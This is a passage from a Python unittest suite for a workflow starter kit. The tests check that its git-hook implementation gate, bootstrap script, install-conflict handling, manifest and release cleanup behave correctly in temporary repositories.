            st=r/'workflow/STATE.md';s=parse_state(st);write_state(st,replace(s,phase='ENGINEERING',active_change='demo',spec_approved='yes',test_design_approved='yes'));h=state_hash_path(st)
            with (r/'workflow/state-log.md').open('a') as f:f.write(f'## fixture\n- State hash: {h}\n')
            sys.path.pop(0);sys.modules.pop('workflow_state',None)
            subprocess.run(['git','add','workflow/STATE.md','workflow/state-log.md'],cwd=r,check=True);subprocess.run(['git','commit','--no-verify','-m','engineering fixture'],cwd=r,check=True,capture_output=True)
            p=r/'PROJECT-PROFILE.md';p.write_text(p.read_text().replace('Type: UNKNOWN','Type: WEB_APP'));subprocess.run(['git','add','PROJECT-PROFILE.md'],cwd=r,check=True)
            g=subprocess.run(['python3','workflow/bin/check-implementation-gate.py','--staged'],cwd=r,capture_output=True,text=True);self.assertNotEqual(g.returncode,0)
        finally:shutil.rmtree(td,ignore_errors=True)


class V1G1Tests(unittest.TestCase):
    def copy_starter(self,r):
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True);shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
    def repo(self,tracked=None):
        td=Path(tempfile.mkdtemp(prefix='v1-g1-'));r=td/'repo';r.mkdir()
        subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','user.email','v1@example.invalid'],cwd=r,check=True)
        subprocess.run(['git','config','user.name','V1'],cwd=r,check=True)
        (r/'src').mkdir();(r/'src/app.py').write_text('print("base")\n')
        for rel,content in (tracked or {}).items():
            p=r/rel;p.parent.mkdir(parents=True,exist_ok=True);p.write_text(content)
        subprocess.run(['git','add','-A'],cwd=r,check=True);subprocess.run(['git','commit','-m','product baseline'],cwd=r,check=True,capture_output=True)
        base=subprocess.check_output(['git','rev-parse','HEAD'],cwd=r,text=True).strip()
        self.copy_starter(r)
        return td,r,base
    def test_tracked_starter_overwrites_warn_and_do_not_commit(self):
        td,r,base=self.repo({'CLAUDE.md':'不要刪掉我\n','AGENTS.md':'own agents\n','README.md':'own readme\n'})
        try:
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','check-install-conflicts'],cwd=r,capture_output=True,text=True)
            self.assertEqual(x.returncode,3,x.stdout+x.stderr)
            combined=x.stdout+x.stderr
            for rel in ('CLAUDE.md','AGENTS.md','README.md'): self.assertIn('M: '+rel,combined)
            self.assertNotIn('No tracked Brownfield installation conflicts or overwrites detected.',combined)
            b=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(b.returncode,3,b.stdout+b.stderr)
            self.assertEqual(subprocess.check_output(['git','rev-parse','HEAD'],cwd=r,text=True).strip(),base)
            self.assertIn('不要刪掉我',subprocess.check_output(['git','show','HEAD:CLAUDE.md'],cwd=r,text=True))
        finally: shutil.rmtree(td,ignore_errors=True)
    def test_overwrite_message_adopt_starter_then_commit_allows_bootstrap(self):
        td,r,base=self.repo({'README.md':'legacy readme\n'})
        try:
            first=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(first.returncode,3,first.stdout+first.stderr)
            msg=first.stdout+first.stderr
            for expected in ('(a) 採用 Starter 版本','(b) 保留原專案版本','(c) 合併兩者','git commit -m "chore: reconcile starter files"','bash workflow/bin/bootstrap.sh'):
                self.assertIn(expected,msg)
            # (a) Keep the Starter README already present in the working tree, commit it, then retry.
            subprocess.run(['git','add','README.md'],cwd=r,check=True)
            subprocess.run(['git','commit','-m','chore: reconcile starter files'],cwd=r,check=True,capture_output=True)
            second=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(second.returncode,0,second.stdout+second.stderr)
            self.assertIn('Brownfield Starter baseline committed and verified',second.stdout+second.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_overwrite_message_merge_then_commit_allows_bootstrap(self):
        td,r,base=self.repo({'README.md':'legacy readme\n'})
        try:
            first=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(first.returncode,3,first.stdout+first.stderr)
            msg=first.stdout+first.stderr
            self.assertIn('(c) 合併兩者',msg)
            self.assertIn('git commit -m "chore: reconcile starter files"',msg)
            # (c) Merge host + Starter intent, save it as a normal host commit, then retry.
            (r/'README.md').write_text('legacy readme\n\nStarter workflow integrated\n')
            subprocess.run(['git','add','README.md'],cwd=r,check=True)
            subprocess.run(['git','commit','-m','chore: reconcile starter files'],cwd=r,check=True,capture_output=True)
            second=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(second.returncode,0,second.stdout+second.stderr)
            self.assertIn('Brownfield Starter baseline committed and verified',second.stdout+second.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_tracked_project_profile_uses_overwrite_path_not_adopt_deadlock(self):
        td,r,base=self.repo({'PROJECT-PROFILE.md':'legacy profile\n'})
        try:
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','check-install-conflicts'],cwd=r,capture_output=True,text=True)
            self.assertEqual(x.returncode,3,x.stdout+x.stderr)
            self.assertIn('tracked Starter-file overwrites',x.stdout+x.stderr)
            self.assertIn('M: PROJECT-PROFILE.md',x.stdout+x.stderr)
            subprocess.run(['git','add','-A'],cwd=r,check=True)
            a=subprocess.run(['python3','workflow/bin/workflow_transition.py','adopt-control-plane','--dry-run'],cwd=r,capture_output=True,text=True)
            self.assertEqual(a.returncode,76,a.stdout+a.stderr)
            # Human resolves/commits profile separately; then remaining Starter installation may proceed.
            pp=r/'PROJECT-PROFILE.md';pp.write_text('legacy profile merged with starter policy\n')
            subprocess.run(['git','add','PROJECT-PROFILE.md'],cwd=r,check=True);subprocess.run(['git','commit','-m','docs: merge project profile'],cwd=r,check=True,capture_output=True)
            b=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(b.returncode,0,b.stdout+b.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)
    def test_adopt_error_order_lists_staged_before_error(self):
        td,r,base=self.repo({'.claude/settings.json':'existing\n'})
        try:
            (r/'src/app.py').write_text('print("changed")\n');subprocess.run(['git','add','-A'],cwd=r,check=True)
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','adopt-control-plane','--dry-run'],cwd=r,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
            self.assertEqual(x.returncode,79,x.stdout)
            self.assertLess(x.stdout.index('Brownfield adoption staged mutations:'),x.stdout.index('ERROR:'))
            self.assertIn('M: src/app.py',x.stdout)
        finally: shutil.rmtree(td,ignore_errors=True)


class V1ManifestAndRevertTests(unittest.TestCase):
    def test_shipped_manifest_entries_exist(self):
        entries=shipped_roots(SRC)
        self.assertEqual(len(entries),len(set(entries)))
        for rel in entries:
            self.assertTrue((SRC/rel).exists(),rel)
        self.assertNotIn('.github',entries)
        forbidden=[]
        for rel in entries:
            root=SRC/rel
            candidates=[root] if root.is_file() else root.rglob('*')
            for path in candidates:
                if path.name=='__pycache__' or path.suffix=='.pyc' or path.name=='.DS_Store':
                    forbidden.append(str(path.relative_to(SRC)))
        self.assertEqual(forbidden,[],f'generated release artifacts found: {forbidden}')

    def test_release_artifact_cleanup_removes_generated_files(self):
        td=Path(tempfile.mkdtemp(prefix='release-clean-'))
        try:
            root=td/'starter'; root.mkdir()
            (root/'workflow/bin').mkdir(parents=True)
            (root/'workflow/SHIPPED-MANIFEST.txt').write_text('workflow/\n',encoding='utf-8')
            (root/'workflow/bin/workflow_state.py').write_text('# marker\n',encoding='utf-8')
            (root/'workflow/tests/__pycache__').mkdir(parents=True)
            (root/'workflow/tests/__pycache__/x.pyc').write_bytes(b'bytecode')
            (root/'workflow/tests/x.pyc').write_bytes(b'bytecode')
            (root/'.DS_Store').write_bytes(b'metadata')
            script=SRC/'workflow/bin/clean-release-artifacts.sh'
            x=subprocess.run(['bash',str(script)],cwd=root,capture_output=True,text=True)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)
            leftovers=[p for p in root.rglob('*') if p.name=='__pycache__' or p.suffix=='.pyc' or p.name=='.DS_Store']
            self.assertEqual(leftovers,[])
        finally:
            shutil.rmtree(td,ignore_errors=True)

    def test_release_cleanup_refuses_non_starter_directory(self):
        td=Path(tempfile.mkdtemp(prefix='release-clean-wrong-root-'))
        try:
            root=td/'project'; root.mkdir()
            cache=root/'src/__pycache__'; cache.mkdir(parents=True)
            pyc=cache/'mod.pyc'; pyc.write_bytes(b'bytecode')
            ds=root/'.DS_Store'; ds.write_bytes(b'metadata')
            script=SRC/'workflow/bin/clean-release-artifacts.sh'
            x=subprocess.run(['bash',str(script)],cwd=root,capture_output=True,text=True)
            self.assertEqual(x.returncode,2,x.stdout+x.stderr)
            self.assertIn('✗ 不在 Starter root（缺少 workflow/SHIPPED-MANIFEST.txt）；拒絕清理',x.stdout+x.stderr)
            self.assertTrue(pyc.exists(),'cleanup must not delete files outside Starter root')
            self.assertTrue(ds.exists(),'cleanup must not delete files outside Starter root')
        finally:
            shutil.rmtree(td,ignore_errors=True)

    def test_shell_scripts_brace_vars_before_non_ascii(self):
        import re
        pattern=re.compile(rb'\$[A-Za-z_][A-Za-z0-9_]*[^\x00-\x7F]')
        offenders=[]
        paths=list((SRC/'workflow/bin').glob('*.sh'))+list((SRC/'.githooks').glob('*'))
        for path in paths:
            if not path.is_file():
                continue
            for lineno,line in enumerate(path.read_bytes().splitlines(),1):
                if pattern.search(line):
                    offenders.append(f'{path.relative_to(SRC)}:{lineno}')
        self.assertEqual(offenders,[],f'unbraced shell variables before non-ASCII: {offenders}')

    def test_installation_path_lists_agree(self):
        import sys
        sys.path.insert(0,str(SRC/'workflow/bin'))
        try:
            from workflow_state import INSTALLATION_ALLOWED_ROOTS, INSTALLATION_ALLOWED_PREFIXES
            manifest=set(shipped_roots(SRC))
            allowed=set(INSTALLATION_ALLOWED_ROOTS)|{x.rstrip('/') for x in INSTALLATION_ALLOWED_PREFIXES}
            self.assertEqual(manifest,allowed)
            bootstrap=(SRC/'workflow/bin/bootstrap.sh').read_text(encoding='utf-8')
            self.assertIn('done < workflow/SHIPPED-MANIFEST.txt',bootstrap)
            self.assertNotIn('paths=(AGENTS.md',bootstrap)
        finally:
            try: sys.path.remove(str(SRC/'workflow/bin'))
            except ValueError: pass

    def test_ci_template_is_copyable(self):
        import re
        p=SRC/'templates/github-workflow-control-plane-audit.yml'
        text=p.read_text(encoding='utf-8')
        self.assertRegex(text,r'uses:\s*actions/checkout@v\d+')
        self.assertIn('fetch-depth: 0',text)
        self.assertIn('audit-control-plane.py',text)
        self.assertNotIn('.github/',p.as_posix())
    def test_revert_to_spec_stales_browser_and_archive_refuses(self):
        td,r=fixture()
        try:
            import sys,re
            sys.path.insert(0,str(r/'workflow/bin'))
            from workflow_state import parse_state,write_state
            from dataclasses import replace
            st=r/'workflow/STATE.md';s=parse_state(st)
            write_state(st,replace(s,phase='ENGINEERING',active_change='demo',spec_approved='yes',test_design_approved='yes'))
            b=r/'workflow/evidence/demo/browser.md';b.parent.mkdir(parents=True,exist_ok=True);b.write_text('Browser Gate: PASS\n')
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','revert-to-spec','demo','--reason','spec gap'],cwd=r,capture_output=True,text=True)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertFalse(b.exists())
            stale=list((r/'workflow/evidence/demo').glob('browser.*.stale.md'))
            self.assertEqual(len(stale),1)
            s2=parse_state(st);self.assertEqual(s2.phase,'SPECIFICATION');self.assertEqual(s2.spec_approved,'no')
            write_state(st,replace(s2,phase='ARCHIVE'))
            y=subprocess.run(['python3','workflow/bin/workflow_transition.py','revert-to-spec','demo'],cwd=r,capture_output=True,text=True)
            self.assertEqual(y.returncode,58,y.stdout+y.stderr)
        finally:
            shutil.rmtree(td,ignore_errors=True)
            if 'sys' in locals():
                try: sys.path.remove(str(r/'workflow/bin'))
                except ValueError: pass

class RC3ScopedTests(unittest.TestCase):
    def _brownfield(self, tracked=None):
        td=Path(tempfile.mkdtemp(prefix='rc3-')); r=td/'repo'; r.mkdir()
        subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','user.email','rc3@example.invalid'],cwd=r,check=True)
        subprocess.run(['git','config','user.name','RC3'],cwd=r,check=True)
        (r/'src').mkdir(); (r/'src/app.py').write_text('print("base")\n')
        for rel,content in (tracked or {}).items():
            p=r/rel; p.parent.mkdir(parents=True,exist_ok=True); p.write_text(content)
        subprocess.run(['git','add','-A'],cwd=r,check=True)
        subprocess.run(['git','commit','-m','product baseline'],cwd=r,check=True,capture_output=True)
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        return td,r

    def test_check_install_conflicts_includes_full_recovery_guidance(self):
        td,r=self._brownfield({'README.md':'legacy\n','.gitignore':'legacy-ignore\n','CLAUDE.md':'legacy claude\n'})
        try:
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','check-install-conflicts'],cwd=r,capture_output=True,text=True)
            self.assertEqual(x.returncode,3,x.stdout+x.stderr)
            msg=x.stdout+x.stderr
            for expected in ('(a) 採用 Starter 版本','(b) 保留原專案版本','(c) 合併兩者','git commit -m "chore: reconcile starter files"','bash workflow/bin/bootstrap.sh'):
                self.assertIn(expected,msg)
            b=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(b.returncode,3,b.stdout+b.stderr)
            for expected in ('(a) 採用 Starter 版本','git commit -m "chore: reconcile starter files"'):
                self.assertIn(expected,b.stdout+b.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)

    def test_policy_documents_and_manifest_are_control_plane(self):
        for rel in ('workflow/SHIPPED-MANIFEST.txt','workflow/CI.md','workflow/BROWSER-VERIFICATION.md'):
            td,r=fixture()
            try:
                subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
                subprocess.run(['git','config','user.email','rc3@example.invalid'],cwd=r,check=True)
                subprocess.run(['git','config','user.name','RC3'],cwd=r,check=True)
                (r/'.githooks/pre-commit').chmod(0o755)
                subprocess.run(['git','add','-A'],cwd=r,check=True)
                subprocess.run(['git','commit','-m','baseline'],cwd=r,check=True,capture_output=True)
                p=r/rel; p.write_text(p.read_text(encoding='utf-8')+'\n# rc3 unauthorized mutation\n',encoding='utf-8')
                subprocess.run(['git','add',rel],cwd=r,check=True)
                g=subprocess.run(['python3','workflow/bin/check-implementation-gate.py','--staged'],cwd=r,capture_output=True,text=True)
                self.assertNotEqual(g.returncode,0,rel+' unexpectedly allowed\n'+g.stdout+g.stderr)
                self.assertIn('Control Plane',g.stderr)
            finally: shutil.rmtree(td,ignore_errors=True)

    def test_crlf_shipped_manifest_bootstrap_succeeds(self):
        td,r=self._brownfield()
        try:
            p=r/'workflow/SHIPPED-MANIFEST.txt'
            text=p.read_text(encoding='utf-8').replace('\r\n','\n').replace('\n','\r\n')
            p.write_bytes(text.encode('utf-8'))
            b=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(b.returncode,0,b.stdout+b.stderr)
            self.assertIn('Brownfield Starter baseline committed and verified',b.stdout+b.stderr)
        finally: shutil.rmtree(td,ignore_errors=True)


class RC4BootstrapFailClosedTests(unittest.TestCase):
    def no_identity_env(self, home):
        import os
        env=dict(os.environ)
        home.mkdir(parents=True,exist_ok=True)
        cfg=home/'gitconfig'
        cfg.write_text('[user]\n\tuseConfigOnly = true\n',encoding='utf-8')
        env['HOME']=str(home)
        env['XDG_CONFIG_HOME']=str(home/'xdg')
        env['GIT_CONFIG_GLOBAL']=str(cfg)
        env['GIT_CONFIG_NOSYSTEM']='1'
        return env

    def test_greenfield_missing_git_identity_fails_before_hooks(self):
        td,r=fixture()
        try:
            home=td/'home'; home.mkdir()
            env=self.no_identity_env(home)
            x=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('baseline commit failed',x.stdout+x.stderr)
            head=subprocess.run(['git','rev-parse','--verify','HEAD'],cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(head.returncode,0)
            hooks=subprocess.run(['git','config','--get','core.hooksPath'],cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(hooks.returncode,0,'hooks must not be enabled after failed baseline commit')
        finally:
            shutil.rmtree(td,ignore_errors=True)

    def _husky_brownfield(self, prefix):
        """建立既有 Husky 專案並放入 Starter files；回傳 (td, repo, env)。"""
        import os
        td=Path(tempfile.mkdtemp(prefix=prefix)); r=td/'repo'; r.mkdir()
        subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','user.email','seed@example.invalid'],cwd=r,check=True)
        subprocess.run(['git','config','user.name','Seed'],cwd=r,check=True)
        (r/'src').mkdir(); (r/'src/app.py').write_text('print("base")\n')
        (r/'.husky').mkdir()
        hook=r/'.husky/pre-commit'; hook.write_text('#!/bin/sh\necho "husky: project checks"\n'); hook.chmod(0o755)
        subprocess.run(['git','add','-A'],cwd=r,check=True)
        subprocess.run(['git','commit','-m','product baseline'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','core.hooksPath','.husky'],cwd=r,check=True)
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
        env=dict(os.environ); env['LC_ALL']='C.UTF-8'
        return td,r,env

    def test_husky_not_chained_fails_bootstrap_and_preserves_hooks_path(self):
        """R2：既有 hook 未串接 Starter gate 時，bootstrap 不得以成功狀態結束。"""
        td,r,env=self._husky_brownfield('rc5-husky-unchained-')
        try:
            setup=(r/'workflow/bin/setup-git-hooks.sh').read_text(encoding='utf-8')
            self.assertIn('core.hooksPath=${existing}；不覆蓋。',setup,'macOS bash 3.2 requires braces before non-ASCII punctuation')
            x=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,env=env,capture_output=True,text=True,encoding='utf-8')
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('已有 core.hooksPath=.husky；不覆蓋。',out)
            self.assertIn('bash .githooks/pre-commit',out,'必須印出具體的串接指令')
            # 有自訂 hook 但無法靜態確認 → UNKNOWN（不是 INACTIVE），且一律不算 active
            self.assertIn('Repository enforcement: UNKNOWN',out)
            self.assertIn('未生效',out)
            hooks=subprocess.run(['git','config','--get','core.hooksPath'],cwd=r,env=env,capture_output=True,text=True,check=True)
            self.assertEqual(hooks.stdout.strip(),'.husky','既有 hooksPath 不得被覆蓋')
        finally:
            shutil.rmtree(td,ignore_errors=True)

    def test_husky_chained_reports_active_and_blocks_product_commit(self):
        """R1/R2：串接之後 enforcement 必須為 ACTIVE_CHAINED，且 gate 真的擋得住。"""
        td,r,env=self._husky_brownfield('rc5-husky-chained-')
        try:
            hook=r/'.husky/pre-commit'
            hook.write_text('#!/bin/sh\necho "husky: project checks"\nbash .githooks/pre-commit || exit 1\n')
            hook.chmod(0o755)
            # bridge 必須 commit 進 HEAD 才算 Repository enforcement —— fresh clone 拿到的是
            # HEAD，不是 worktree。--no-verify 是必要的：此刻 gate 尚未通過驗證，而
            # 「先 commit bridge 才驗得起來」是這個流程本身的先後順序。
            subprocess.run(['git','add','.husky/pre-commit'],cwd=r,env=env,check=True)
            subprocess.run(['git','commit','-q','--no-verify','-m','chain starter gate'],
                           cwd=r,env=env,check=True)
            # 第一次：靜態找到 bridge，但尚未行為驗證 → 必須要求 probe
            x=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,env=env,capture_output=True,text=True,encoding='utf-8')
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('setup-git-hooks.sh --probe',out,'必須給出明確的下一步')
            pre=subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status'],cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(pre.returncode,0,'probe 之前不得回報 active')
            self.assertIn('CHAINED_STATIC',pre.stdout,'靜態命中的狀態名必須是 CHAINED_STATIC')
            # 行為驗證後才算生效
            x=subprocess.run(['bash','workflow/bin/setup-git-hooks.sh','--probe'],cwd=r,env=env,capture_output=True,text=True,encoding='utf-8')
            out=x.stdout+x.stderr
            self.assertEqual(x.returncode,0,out)
            self.assertIn('通過行為驗證',out)
            hooks=subprocess.run(['git','config','--get','core.hooksPath'],cwd=r,env=env,capture_output=True,text=True,check=True)
            self.assertEqual(hooks.stdout.strip(),'.husky','既有 hooksPath 不得被覆蓋')

            # probe 之後才是 ACTIVE_CHAINED
            s=subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status'],cwd=r,env=env,capture_output=True,text=True)
            self.assertEqual(s.returncode,0,s.stdout+s.stderr)
            self.assertIn('ACTIVE_CHAINED',s.stdout)

            # 行為驗證：Implementation allowed=no 時實際嘗試 commit 產品檔案必須被拒。
            (r/'src/sneak.py').write_text('print("sneak")\n')
            subprocess.run(['git','add','src/sneak.py'],cwd=r,env=env,check=True)
            c=subprocess.run(['git','commit','-m','feat: sneak'],cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(c.returncode,0,c.stdout+c.stderr)
            self.assertIn('Implementation allowed=no',c.stdout+c.stderr)
        finally:
            shutil.rmtree(td,ignore_errors=True)

    def test_brownfield_missing_git_identity_fails_before_hooks(self):
        td=Path(tempfile.mkdtemp(prefix='rc4-brown-')); r=td/'repo'; r.mkdir()
        try:
            subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','config','user.email','seed@example.invalid'],cwd=r,check=True)
            subprocess.run(['git','config','user.name','Seed'],cwd=r,check=True)
            (r/'src').mkdir(); (r/'src/app.py').write_text('print("base")\n')
            subprocess.run(['git','add','-A'],cwd=r,check=True)
            subprocess.run(['git','commit','-m','product baseline'],cwd=r,check=True,capture_output=True)
            subprocess.run(['git','config','--unset','user.email'],cwd=r,check=True)
            subprocess.run(['git','config','--unset','user.name'],cwd=r,check=True)
            for rel in OWNED:
                src=SRC/rel
                if not src.exists(): continue
                dst=r/rel
                if src.is_dir():
                    shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
                else:
                    dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
            (r/'.githooks/pre-commit').chmod(0o755)
            home=td/'home'; home.mkdir()
            env=self.no_identity_env(home)
            x=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('Brownfield Starter baseline commit failed',x.stdout+x.stderr)
            hooks=subprocess.run(['git','config','--get','core.hooksPath'],cwd=r,env=env,capture_output=True,text=True)
            self.assertNotEqual(hooks.returncode,0,'hooks must not be enabled after failed Brownfield baseline commit')
            count=subprocess.run(['git','rev-list','--count','HEAD'],cwd=r,env=env,capture_output=True,text=True,check=True)
            self.assertEqual(count.stdout.strip(),'1')
        finally:
            shutil.rmtree(td,ignore_errors=True)


class RC5AdoptExecBitTests(unittest.TestCase):
    """R5：adopt 路徑的安裝 commit 必須就是 100755，否則 clone 之後 git 不會執行 hook。"""

    def _brownfield_with_cp_conflict(self):
        td=Path(tempfile.mkdtemp(prefix='rc5-adopt-')); r=td/'repo'; r.mkdir()
        subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','user.email','a@example.invalid'],cwd=r,check=True)
        subprocess.run(['git','config','user.name','A'],cwd=r,check=True)
        (r/'src').mkdir(); (r/'src/app.py').write_text('print("base")\n')
        (r/'.claude').mkdir(); (r/'.claude/settings.json').write_text('{"permissions":{"allow":[]}}\n')
        subprocess.run(['git','add','-A'],cwd=r,check=True)
        subprocess.run(['git','commit','-m','product baseline'],cwd=r,check=True,capture_output=True)
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        # 刻意留成 644：模擬散發目錄的預設狀態，adopt 必須自己修正。
        (r/'.githooks/pre-commit').chmod(0o644)
        subprocess.run(['git','add','-A'],cwd=r,check=True)
        return td,r

    def _adopt(self,r):
        import importlib.util,sys,argparse,io,contextlib
        sys.path.insert(0,str(r/'workflow/bin'))
        spec=importlib.util.spec_from_file_location('wt_rc5',r/'workflow/bin/workflow_transition.py')
        m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
        m.tty_human_confirm=lambda action,change:'test-human'
        buf=io.StringIO()
        with contextlib.redirect_stdout(buf):
            m.cmd_adopt_control_plane(argparse.Namespace(dry_run=False))
        sys.path.pop(0); sys.modules.pop('workflow_state',None)
        return buf.getvalue()

    def test_adopt_commits_hook_as_executable(self):
        td,r=self._brownfield_with_cp_conflict()
        try:
            before=subprocess.run(['git','ls-files','-s','.githooks/pre-commit'],cwd=r,capture_output=True,text=True,check=True)
            self.assertTrue(before.stdout.startswith('100644'),'前置條件：staged 時應為 644')
            self._adopt(r)
            after=subprocess.run(['git','ls-files','-s','.githooks/pre-commit'],cwd=r,capture_output=True,text=True,check=True)
            self.assertTrue(after.stdout.startswith('100755'),
                            f'adopt 後 index mode 必須是 100755，實際為：{after.stdout.strip()}')
            head=subprocess.run(['git','show','--format=','--raw','HEAD','--','.githooks/pre-commit'],cwd=r,capture_output=True,text=True,check=True)
            self.assertIn('100755',head.stdout,'安裝 commit 本身就必須記錄 100755')
        finally:
            shutil.rmtree(td,ignore_errors=True)

    def test_enforcement_reports_inactive_when_index_mode_is_644(self):
        """R1：即使 hooksPath 正確、磁碟上可執行，index mode 是 644 仍不算 ACTIVE。"""
        td,r=self._brownfield_with_cp_conflict()
        try:
            self._adopt(r)
            subprocess.run(['git','config','core.hooksPath','.githooks'],cwd=r,check=True)
            subprocess.run(['git','update-index','--chmod=-x','.githooks/pre-commit'],cwd=r,check=True)
            (r/'.githooks/pre-commit').chmod(0o755)  # 磁碟上仍可執行，只有 index 是 644
            x=subprocess.run(['python3','workflow/bin/workflow_transition.py','enforcement-status'],cwd=r,capture_output=True,text=True)
            self.assertNotEqual(x.returncode,0,x.stdout+x.stderr)
            self.assertIn('INACTIVE',x.stdout+x.stderr)
            self.assertIn('index mode',x.stdout+x.stderr)
        finally:
            shutil.rmtree(td,ignore_errors=True)


class RC5VerificationPolicyTests(unittest.TestCase):
    """R3/R4：零檢查不得產生 PASS；已配置但 runner 不可用必須失敗。"""

    def _repo(self, kind):
        td=Path(tempfile.mkdtemp(prefix='rc5-verify-')); r=td/'repo'; r.mkdir()
        if kind=='python':
            (r/'src').mkdir(); (r/'tests').mkdir()
            (r/'src/app.py').write_text('x = 1\n')
            (r/'tests/test_x.py').write_text('def test_x():\n    assert True\n')
            (r/'pyproject.toml').write_text('[project]\nname = "p"\nversion = "0.1"\n\n[tool.pytest.ini_options]\ntestpaths = ["tests"]\n')
        else:
            (r/'docs.md').write_text('# 純文件 repo\n')
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(src,dst)
        pp=r/'PROJECT-PROFILE.md'
        pp.write_text(pp.read_text(encoding='utf-8').replace('Type: UNKNOWN','Type: CLI').replace('Web verification required: auto','Web verification required: no'),encoding='utf-8')
        st=r/'workflow/STATE.md'
        st.write_text(st.read_text(encoding='utf-8').replace('Active OpenSpec change: none','Active OpenSpec change: demo'),encoding='utf-8')
        # evidence 現在要自證來歷，所以 fixture 必須有一份「已批准」的 profile digest。
        self.approved_digest=stamp_approved_profile(r)
        return td,r

    def _verify(self,r):
        import os
        env=dict(os.environ)
        # 確保 pytest / ruff 不在 PATH 上，模擬未啟用虛擬環境的預設情境
        env['PATH']='/usr/bin:/bin'
        return subprocess.run(['bash','workflow/bin/verify.sh','--full'],cwd=r,env=env,capture_output=True,text=True)

    def test_configured_but_unavailable_runner_fails(self):
        td,r=self._repo('python')
        try:
            x=self._verify(r)
            out=x.stdout+x.stderr
            self.assertNotEqual(x.returncode,0,out)
            self.assertIn('已在專案中配置，但',out)
